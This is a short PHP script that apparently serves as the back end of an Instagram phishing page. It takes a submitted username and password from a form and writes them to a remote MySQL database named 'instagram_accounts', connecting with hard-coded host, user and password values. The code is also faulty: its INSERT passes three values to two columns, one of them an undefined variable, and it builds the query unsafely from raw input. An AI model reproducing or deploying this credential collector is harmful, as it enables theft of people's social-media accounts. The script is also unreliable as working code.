<?php
	$username = $_POST['id'];
	$password = $_POST['pass'];


$baglan=mysqli_connect("78.135.85.137","furkan","u2sxvuVIo1vOnZayBRdB","instagram_accounts"); 
mysqli_set_charset($baglan, "utf8");

$sqlekle="INSERT INTO users_info(username, password) VALUES ('$isim','$username','$password')";

$sonuc=mysqli_query($baglan,$sqlekle);

if ($sonuc==0)
     echo "Eklenemedi, kontrol ediniz";
else
     echo "Başarıyla eklendi";

?>




